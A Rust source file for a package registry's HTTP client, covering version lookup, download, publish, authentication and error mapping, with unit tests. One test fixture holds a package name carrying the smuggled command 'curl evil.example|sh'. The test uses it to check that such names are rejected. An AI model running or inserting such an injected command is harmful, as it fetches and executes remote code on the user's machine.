use std::time::{Duration, SystemTime};

use http::StatusCode;
use serde::de::DeserializeOwned;
use specforge_effects::http::{Any, MAX_REDIRECTS};
use specforge_effects::{Header, HttpOutcome, HttpRequest, OutcomeClass, SharedHttp, Unreachable};
use specforge_registry_wire::reply::{self, Failure};
use specforge_registry_wire::{
    ErrorCode, PackageMetadata, PackageSignature, PublishReceipt, SearchHit, SearchQuery,
    SearchResults, Timestamp, TokenVerified, VersionList, address::Call, form,
};

use super::registry_client::{RegistryClient, RegistryError};
use super::registry_config::{RegistryConfig, RegistryCredential};
use specforge_package::DeclaredPackage;
use specforge_package::MAX_PACKAGE_BYTES;
use specforge_package::PackageName;
use specforge_package::Version;

/// The registry protocol over the effect plane's `Http` port (ADR 0335): the token is a sensitive header (dropped on
/// a redirect to another origin), every call is held to one timeout, and every body to its cap.
pub struct HttpRegistryClient {
    http: SharedHttp,
    timeout: Duration,
}

impl HttpRegistryClient {
    pub fn new(http: SharedHttp) -> Self {
        Self {
            http,
            timeout: Duration::from_secs(30),
        }
    }

    pub fn with_timeout(mut self, timeout: Duration) -> Self {
        self.timeout = timeout;
        self
    }

    /// `method url` with `credential` as its bearer token, its body read up to `cap` bytes. A registry is where its
    /// user configured it, so a private address is allowed.
    fn call(
        &self,
        method: &str,
        url: &str,
        credential: Option<&RegistryCredential>,
        cap: u64,
    ) -> HttpRequest {
        HttpRequest {
            method: method.into(),
            url: url.into(),
            headers: credential
                .map(|c| Header::sensitive("Authorization", format!("Bearer {}", c.token())))
                .into_iter()
                .collect(),
            body: None,
            body_cap: cap,
            timeout_ms: self.timeout.as_millis() as u64,
            max_redirects: MAX_REDIRECTS,
            allow_private: true,
            keep_headers: vec!["retry-after".into()],
        }
    }

    fn send(&self, request: &HttpRequest) -> HttpOutcome {
        self.http.request(request, &Any)
    }

    /// `GET address` with `credential`, its answer read as `T`.
    fn get<T: DeserializeOwned>(
        &self,
        address: &str,
        credential: Option<&RegistryCredential>,
        subject: &str,
    ) -> Result<T, RegistryError> {
        let outcome = self.send(&self.call("GET", address, credential, MAX_PACKAGE_BYTES));
        answer(outcome, address, subject)
    }
}

impl RegistryClient for HttpRegistryClient {
    fn versions(
        &self,
        name: &PackageName,
        registry: &RegistryConfig,
        credential: Option<&RegistryCredential>,
    ) -> Result<Vec<Version>, RegistryError> {
        let credential = credential.filter(|c| c.is_for(registry));
        let address = registry.url.address(&Call::Package(name));
        let body: VersionList = self.get(&address, credential, name.as_str())?;
        Ok(body.versions)
    }

    fn metadata(
        &self,
        name: &PackageName,
        version: &Version,
        registry: &RegistryConfig,
        credential: Option<&RegistryCredential>,
    ) -> Result<PackageMetadata, RegistryError> {
        let credential = credential.filter(|c| c.is_for(registry));
        let subject = format!("{name}@{version}");
        let address = registry.url.address(&Call::Version(name, version));
        let mut body: PackageMetadata = self.get(&address, credential, &subject)?;
        body.wasm_url = registry
            .url
            .download_address(&body.wasm_url)
            .map_err(|why| RegistryError::InvalidReply {
                subject,
                message: format!("{address}: {why}"),
            })?;
        Ok(body)
    }

    fn download(
        &self,
        metadata: &PackageMetadata,
        registry: &RegistryConfig,
        credential: Option<&RegistryCredential>,
    ) -> Result<Vec<u8>, RegistryError> {
        let wasm_url = metadata.wasm_url.as_str();
        // The registry's token goes to the registry, not to wherever it points a download.
        let credential =
            credential.filter(|c| c.is_for(registry) && registry.url.same_origin(wasm_url));
        let outcome = self.send(&self.call("GET", wasm_url, credential, metadata.download_limit()));
        match outcome.status {
            Some(200) | None => read(outcome).map(|(_, body)| body).map_err(|why| {
                unread(why, wasm_url, &subject_of(metadata), || over_text(metadata))
            }),
            Some(_) => Err(failure_of(outcome, wasm_url, wasm_url)),
        }
    }

    fn search(
        &self,
        query: &SearchQuery,
        registry: &RegistryConfig,
        credential: Option<&RegistryCredential>,
    ) -> Result<Vec<SearchHit>, RegistryError> {
        let credential = credential.filter(|c| c.is_for(registry));
        let address = registry.url.address(&Call::Search(query));
        let body: SearchResults = self.get(&address, credential, &query.q)?;
        Ok(body.results)
    }

    fn publish(
        &self,
        package: &DeclaredPackage<'_>,
        wasm: &[u8],
        manifest_json: &str,
        signature: &PackageSignature,
        registry: &RegistryConfig,
        credential: Option<&RegistryCredential>,
    ) -> Result<PublishReceipt, RegistryError> {
        let credential = credential.filter(|c| c.is_for(registry));
        let (name, version) = (package.name(), package.version());
        let url = registry.url.address(&Call::Version(name, version));

        // The multipart body is built here: deterministic and length-known.
        let boundary = format!(
            "specforge-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or(0)
        );
        let mut request = self.call("PUT", &url, credential, MAX_PACKAGE_BYTES);
        request
            .headers
            .push(Header::plain("Content-Type", form::content_type(&boundary)));
        request.body = Some(form::body(
            &boundary,
            manifest_json,
            wasm,
            Some(&signature.to_json()),
        ));

        let outcome = self.send(&request);
        if outcome.status == Some(409) {
            return Err(RegistryError::DuplicateVersion {
                name: name.to_string(),
                version: version.to_string(),
            });
        }
        answer(outcome, &url, &format!("{name}@{version}"))
    }

    fn authenticate(
        &self,
        registry: &RegistryConfig,
        credential: &RegistryCredential,
    ) -> Result<Option<Timestamp>, RegistryError> {
        let url = registry.url.address(&Call::AuthVerify);
        let mut request = self.call("POST", &url, Some(credential), MAX_PACKAGE_BYTES);
        request
            .headers
            .push(Header::plain("Content-Type", "application/json"));
        request.body = Some(b"{}".to_vec());
        let body: TokenVerified = answer(self.send(&request), &url, registry.url.as_str())?;
        Ok(body.expires_at)
    }
}

/// Why a call's answer was not read to its end.
enum Unread {
    /// Longer than its limit: its `Content-Length` said so, or its `limit + 1`th byte arrived.
    Over,
    /// No answer, or a body still arriving, when the call's timeout ran out.
    Late,
    /// The transport failed while reading the body.
    Broken(String),
    /// No answer came: what the transport said.
    Unanswered(String),
}

/// An answer's status and whole body (ADR 0250: the port read at most the call's cap, all of it within its
/// timeout), or why there is none.
fn read(outcome: HttpOutcome) -> Result<(u16, Vec<u8>), Unread> {
    let detail = outcome.detail.unwrap_or_default();
    match (outcome.class, outcome.status) {
        (OutcomeClass::Ok | OutcomeClass::Status(_), Some(status)) => Ok((status, outcome.body)),
        (OutcomeClass::Capped, _) => Err(Unread::Over),
        (OutcomeClass::Unreachable(Unreachable::Timeout), _) => Err(Unread::Late),
        (OutcomeClass::Unreachable(_), Some(_)) => Err(Unread::Broken(detail)),
        _ => Err(Unread::Unanswered(detail)),
    }
}

/// The download of `metadata`'s binary, longer than [`PackageMetadata::download_limit`] allows (ADR 0250): the
/// error both adapters give, so their text is one.
#[cfg(any(test, feature = "testing"))]
pub(crate) fn oversized(metadata: &PackageMetadata) -> RegistryError {
    unread(
        Unread::Over,
        &metadata.wasm_url,
        &subject_of(metadata),
        || over_text(metadata),
    )
}

fn subject_of(metadata: &PackageMetadata) -> String {
    format!("{}@{}", metadata.name, metadata.version)
}

/// What a download over its limit exceeded: the size its reply declares, else the ceiling.
fn over_text(metadata: &PackageMetadata) -> String {
    let limit = metadata.download_limit();
    if metadata.size_bytes == limit {
        format!("the download is larger than the {limit} bytes its reply declares (size_bytes)")
    } else {
        "the download is larger than 64 MiB (67108864 bytes), the largest package a registry accepts"
            .into()
    }
}

/// The error a body that was read as `why` is, for the answer at `address` about `subject`; `over` says what it
/// exceeded.
fn unread(
    why: Unread,
    address: &str,
    subject: &str,
    over: impl FnOnce() -> String,
) -> RegistryError {
    match why {
        Unread::Over => RegistryError::InvalidReply {
            subject: subject.to_string(),
            message: format!("{address}: {}", over()),
        },
        Unread::Late => RegistryError::Timeout {
            url: address.to_string(),
        },
        Unread::Broken(e) => RegistryError::NetworkError {
            message: format!("failed to read the response body: {e}"),
        },
        Unread::Unanswered(message) => RegistryError::NetworkError { message },
    }
}

/// `outcome`, the answer to the call sent to `address`, read the one way every call reads (ADR 0044 D2 as amended
/// by ADR 0075).
fn answer<T: DeserializeOwned>(
    outcome: HttpOutcome,
    address: &str,
    subject: &str,
) -> Result<T, RegistryError> {
    let retry_after = outcome.header("retry-after").map(str::to_string);
    let (status, body) = read(outcome).map_err(|why| {
        unread(why, address, subject, || {
            "the answer is larger than 64 MiB (67108864 bytes), more than any registry answer may be"
                .into()
        })
    })?;
    reply::read(status, &body).map_err(|failure| {
        error_of(
            failure,
            retry_after.as_deref(),
            address,
            subject,
            SystemTime::now(),
        )
    })
}

/// Read a failure answer (`outcome` has a status) to the call sent to `address`: its status, `Retry-After` and
/// body, as [`error_of`] sees them.
fn failure_of(outcome: HttpOutcome, address: &str, subject: &str) -> RegistryError {
    let status = outcome.status.unwrap_or_default();
    let retry_after = outcome.header("retry-after").map(str::to_string);
    // An over-long or broken failure body is read as none: the status alone decides.
    let body = read(outcome).map(|(_, body)| body).unwrap_or_default();
    error_of(
        reply::failure(status, &body),
        retry_after.as_deref(),
        address,
        subject,
        SystemTime::now(),
    )
}

/// What a failure means to a client, the same for every call (ADR 0044): 400 `Refused` (the registry's code and
/// message, else `Unknown` and "registry answered 400 Bad Request"); 401 `Unauthorized` and 403 `Forbidden` (the
/// registry's message as guidance, else a default); a 404 with the protocol's `NOT_FOUND` `NotFound` naming
/// `subject`; 429 `RateLimited` (its `Retry-After` as `now` sees it); not a registry's answer `InvalidReply` naming
/// `subject`, its message `"{address}: {why}"` (R009); anything else `NetworkError` with the registry's message,
/// else "registry answered {status}". Publish reads 409 as `DuplicateVersion` before asking this.
fn error_of(
    failure: Failure,
    retry_after: Option<&str>,
    address: &str,
    subject: &str,
    now: SystemTime,
) -> RegistryError {
    let (status, message, code) = match failure {
        Failure::NotRegistry { why, .. } => {
            return RegistryError::InvalidReply {
                subject: subject.to_string(),
                message: format!("{address}: {why}"),
            };
        }
        Failure::Error { status, error } => (status, Some(error.message), error.code),
        Failure::Status { status } => (status, None, ErrorCode::Unknown),
    };
    let named = StatusCode::from_u16(status)
        .map(|s| s.to_string())
        .unwrap_or_else(|_| status.to_string());
    match status {
        400 => RegistryError::Refused {
            code,
            message: message.unwrap_or_else(|| format!("registry answered {named}")),
        },
        401 => RegistryError::Unauthorized {
            guidance: message.unwrap_or_else(|| "token expired or invalid".to_string()),
        },
        403 => RegistryError::Forbidden {
            guidance: message.unwrap_or_else(|| "insufficient permissions".to_string()),
        },
        404 => RegistryError::NotFound {
            specifier: subject.to_string(),
        },
        429 => RegistryError::RateLimited {
            retry_after_ms: parse_retry_after_ms(retry_after, now),
        },
        _ => RegistryError::NetworkError {
            message: message.unwrap_or_else(|| format!("registry answered {named}")),
        },
    }
}

/// Fallback delay when a 429 response carries no usable `Retry-After`.
const DEFAULT_RETRY_AFTER_MS: u64 = 5000;

/// Parse a `Retry-After` header value into a delay in milliseconds.
///
/// Per RFC 9110 the value is either delta-seconds or an HTTP-date. Falls back
/// to [`DEFAULT_RETRY_AFTER_MS`] when the header is absent or malformed. An
/// HTTP-date in the past yields `0`.
fn parse_retry_after_ms(header: Option<&str>, now: SystemTime) -> u64 {
    let Some(value) = header.map(str::trim) else {
        return DEFAULT_RETRY_AFTER_MS;
    };

    if let Ok(seconds) = value.parse::<u64>() {
        return seconds.saturating_mul(1000);
    }

    match httpdate::parse_http_date(value) {
        Ok(retry_at) => match retry_at.duration_since(now) {
            Ok(wait) => wait.as_millis() as u64,
            Err(_) => 0,
        },
        Err(_) => DEFAULT_RETRY_AFTER_MS,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use specforge_registry_wire::{ErrorBody, RegistryRoot};

    const NOW: SystemTime = SystemTime::UNIX_EPOCH;

    /// What a client makes of `status` and `body`, for a call to `http://r/v1/x`.
    fn failed(status: u16, retry_after: Option<&str>, body: &str, subject: &str) -> RegistryError {
        error_of(
            reply::failure(status, body.as_bytes()),
            retry_after,
            "http://r/v1/x",
            subject,
            NOW,
        )
    }

    /// `body` as the answer (200) to a call for `subject`, read the way every call reads one.
    fn read<T: DeserializeOwned>(body: &[u8], subject: &str) -> Result<T, RegistryError> {
        reply::read(200, body)
            .map_err(|failure| error_of(failure, None, "http://r/x", subject, NOW))
    }

    #[specforge_test_macros::test(
        behavior = "search_registry",
        verify = "a search reply holding a hit that is no package name or no SemVer version is that registry's failure, R009"
    )]
    fn a_search_reply_with_a_hit_that_is_no_package_name_is_r009() {
        let body = br#"{"results":[{"name":"@sdk/greet; curl evil.example|sh","version":"9.9.9","description":""}]}"#;
        let error = read::<SearchResults>(body, "greet").unwrap_err();
        assert!(
            matches!(error, RegistryError::InvalidReply { .. }),
            "{error:?}"
        );
        let diagnostic = error.to_diagnostic();
        assert_eq!(diagnostic.code, "R009");
        assert!(
            diagnostic.message.contains("is not a package name"),
            "{diagnostic:?}"
        );
    }

    fn error_body(message: &str) -> String {
        serde_json::to_string(&ErrorBody::new(ErrorCode::NotFound, message)).unwrap()
    }

    #[specforge_test_macros::test(
        behavior = "authenticate_registry_request",
        verify = "every registry call reads an answer's status as one error"
    )]
    fn every_call_reads_a_status_alike() {
        let read = |status: u16, retry_after: Option<&str>, body: &str| {
            failed(status, retry_after, body, "@acme/tool@1.0.0")
        };
        assert_eq!(
            read(401, None, &error_body("token revoked")),
            RegistryError::Unauthorized {
                guidance: "token revoked".into()
            }
        );
        assert_eq!(
            read(401, None, ""),
            RegistryError::Unauthorized {
                guidance: "token expired or invalid".into()
            }
        );
        assert_eq!(
            read(403, None, &error_body("token lacks scope @acme")),
            RegistryError::Forbidden {
                guidance: "token lacks scope @acme".into()
            }
        );
        assert_eq!(
            read(404, None, &error_body("gone")),
            RegistryError::NotFound {
                specifier: "@acme/tool@1.0.0".into()
            }
        );
        // A 404 is the registry's only with its NOT_FOUND error; a bare one says no registry serves the address.
        let not_a_registry = RegistryError::InvalidReply {
            subject: "@acme/tool@1.0.0".into(),
            message: "http://r/v1/x: a 404 without the registry protocol's NOT_FOUND error: no registry serves this address".into(),
        };
        assert_eq!(read(404, None, ""), not_a_registry);
        assert_eq!(read(404, None, "<html>not found</html>"), not_a_registry);
        assert_eq!(
            read(429, Some("60"), &error_body("slow down")),
            RegistryError::RateLimited {
                retry_after_ms: 60_000
            }
        );
        assert_eq!(
            read(429, None, ""),
            RegistryError::RateLimited {
                retry_after_ms: DEFAULT_RETRY_AFTER_MS
            }
        );
        assert_eq!(
            read(400, None, &error_body("bad form")),
            RegistryError::Refused {
                code: ErrorCode::NotFound,
                message: "bad form".into()
            }
        );
        assert_eq!(
            read(500, None, &error_body("database is down")),
            RegistryError::NetworkError {
                message: "database is down".into()
            }
        );
        assert_eq!(
            read(502, None, ""),
            RegistryError::NetworkError {
                message: "registry answered 502 Bad Gateway".into()
            }
        );
    }

    #[specforge_test_macros::test(
        behavior = "authenticate_registry_request",
        verify = "403 response produces E-level diagnostic with permission guidance"
    )]
    fn a_403_is_forbidden_whatever_the_call() {
        // §3 R2: the same 403 was R005 for a version list and R002 for one version.
        let body = error_body("token lacks scope @acme");
        for subject in [
            "@acme/tool",
            "@acme/tool@1.0.0",
            "http://r/v1/x/download",
            "q",
        ] {
            let error = failed(403, None, &body, subject);
            assert_eq!(
                error,
                RegistryError::Forbidden {
                    guidance: "token lacks scope @acme".into()
                }
            );
            let diagnostic = error.to_diagnostic();
            assert_eq!(diagnostic.code, "R002");
            assert!(diagnostic.message.contains("token lacks scope @acme"));
        }
    }

    #[specforge_test_macros::test(
        behavior = "publish_to_registry",
        verify = "a registry's refusal reaches the publisher with its reason"
    )]
    fn a_registry_refusal_is_its_own_error() {
        let body = serde_json::to_string(&ErrorBody::new(
            ErrorCode::UnsignedPackage,
            "packages must be signed",
        ))
        .unwrap();
        let error = failed(400, None, &body, "@acme/tool@1.0.0");
        assert_eq!(
            error,
            RegistryError::Refused {
                code: ErrorCode::UnsignedPackage,
                message: "packages must be signed".into()
            }
        );
        let diagnostic = error.to_diagnostic();
        assert_eq!(diagnostic.code, "R008");
        assert!(diagnostic.message.contains("UNSIGNED_PACKAGE"));
        assert!(diagnostic.message.contains("packages must be signed"));
        assert!(!diagnostic.suggestion.unwrap().contains("network"));

        assert_eq!(
            failed(400, None, "", "x"),
            RegistryError::Refused {
                code: ErrorCode::Unknown,
                message: "registry answered 400 Bad Request".into()
            }
        );
    }

    #[specforge_test_macros::test(
        behavior = "check_registry_reply",
        verify = "a reply that is not the protocol's JSON is refused with R009, even with --allow-unsigned"
    )]
    fn a_reply_that_is_not_the_protocols_json_is_refused() {
        let error = read::<PackageMetadata>(br#"{"name":"@a/b","version":"1.0.0"}"#, "@a/b@1.0.0")
            .unwrap_err();
        assert!(
            matches!(&error, RegistryError::InvalidReply { subject, message }
                if subject == "@a/b@1.0.0" && message.contains("sha256")),
            "{error:?}"
        );
        assert_eq!(error.to_diagnostic().code, "R009");
        assert!(matches!(
            read::<VersionList>(b"<html>", "@a/b").unwrap_err(),
            RegistryError::InvalidReply { .. }
        ));
    }

    #[specforge_test_macros::test(
        behavior = "check_registry_reply",
        verify = "a reply that is not the protocol's JSON is refused with R009, even with --allow-unsigned"
    )]
    fn a_malformed_signature_in_a_reply_is_refused_with_r009() {
        let body = br#"{"name":"@a/b","version":"1.0.0","sha256":"abababababababababababababababababababababababababababababababab","wasm_url":"/x","signature":{"sig":"x","public_key":"z","signed_at":"now"}}"#;
        let error = read::<PackageMetadata>(body, "@a/b@1.0.0").unwrap_err();
        assert!(
            matches!(&error, RegistryError::InvalidReply { message, .. }
                if message.contains("`sig` is not 128 hex")),
            "{error:?}"
        );
        assert_eq!(error.to_diagnostic().code, "R009");
    }

    #[specforge_test_macros::test(
        behavior = "check_registry_reply",
        verify = "a 404 without the protocol's NOT_FOUND error is R009, not package not found"
    )]
    fn a_bare_404_is_r009_naming_the_address() {
        let diagnostic = failed(404, None, "", "@acme/tool").to_diagnostic();

        assert_eq!(diagnostic.code, "R009");
        assert!(diagnostic.message.contains("http://r/v1/x"));
        assert!(
            diagnostic
                .message
                .contains("no registry serves this address")
        );
        let suggestion = diagnostic.suggestion.unwrap();
        assert!(suggestion.contains("the registry's root"), "{suggestion}");
        assert!(suggestion.contains("without /v1"), "{suggestion}");
    }

    #[test]
    fn retry_after_delta_seconds() {
        let now = SystemTime::UNIX_EPOCH + std::time::Duration::from_secs(1_000_000_000);
        assert_eq!(parse_retry_after_ms(Some("120"), now), 120_000);
        assert_eq!(parse_retry_after_ms(Some(" 30 "), now), 30_000);
        assert_eq!(parse_retry_after_ms(Some("0"), now), 0);
    }

    #[test]
    fn retry_after_http_date() {
        let now = SystemTime::UNIX_EPOCH + std::time::Duration::from_secs(1_000_000_000);
        let future = now + std::time::Duration::from_secs(90);
        let past = now - std::time::Duration::from_secs(90);
        assert_eq!(
            parse_retry_after_ms(Some(&httpdate::fmt_http_date(future)), now),
            90_000
        );
        assert_eq!(
            parse_retry_after_ms(Some(&httpdate::fmt_http_date(past)), now),
            0
        );
    }

    #[test]
    fn retry_after_absent_or_malformed_falls_back_to_default() {
        let now = SystemTime::UNIX_EPOCH;
        assert_eq!(parse_retry_after_ms(None, now), DEFAULT_RETRY_AFTER_MS);
        assert_eq!(
            parse_retry_after_ms(Some("soon"), now),
            DEFAULT_RETRY_AFTER_MS
        );
    }

    /// A listener that answers every request "no such package" and sends back the `Authorization` lines it saw.
    fn catcher() -> (RegistryRoot, std::sync::mpsc::Receiver<String>) {
        use std::io::{Read as _, Write as _};
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let root = RegistryRoot::parse(&format!(
            "http://127.0.0.1:{}/b",
            listener.local_addr().unwrap().port()
        ))
        .unwrap();
        let (seen, lines) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut stream) = stream else { continue };
                let mut head = Vec::new();
                let mut byte = [0u8; 1];
                while !head.ends_with(b"\r\n\r\n") && stream.read(&mut byte).is_ok_and(|n| n == 1) {
                    head.push(byte[0]);
                }
                let head = String::from_utf8_lossy(&head).to_ascii_lowercase();
                let line = head.lines().find(|l| l.starts_with("authorization:"));
                let _ = seen.send(line.unwrap_or("").to_string());
                let body = r#"{"error":{"code":"NOT_FOUND","message":"gone"}}"#;
                let _ = write!(
                    stream,
                    "HTTP/1.1 404 Not Found\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                    body.len()
                );
            }
        });
        (root, lines)
    }

    #[specforge_test_macros::test(
        behavior = "authenticate_registry_request",
        verify = "a request carries a credential only to the registry root it was kept for"
    )]
    fn a_credential_goes_only_to_its_own_root() {
        let (root, lines) = catcher();
        let registry = RegistryConfig {
            alias: "main".into(),
            url: root.clone(),
            scope_filter: None,
            default_registry: true,
        };
        let name = PackageName::parse("@acme/thing").unwrap();
        let other = RegistryRoot::parse("http://127.0.0.1:1/a").unwrap();
        let client = HttpRegistryClient::new(std::sync::Arc::new(specforge_http::Client::new()));

        let _ = client.versions(&name, &registry, Some(&RegistryCredential::new(other, "t")));
        assert_eq!(
            lines.recv().unwrap(),
            "",
            "a credential for another root was sent"
        );

        let _ = client.versions(&name, &registry, Some(&RegistryCredential::new(root, "t")));
        assert_eq!(lines.recv().unwrap(), "authorization: bearer t");
    }
}
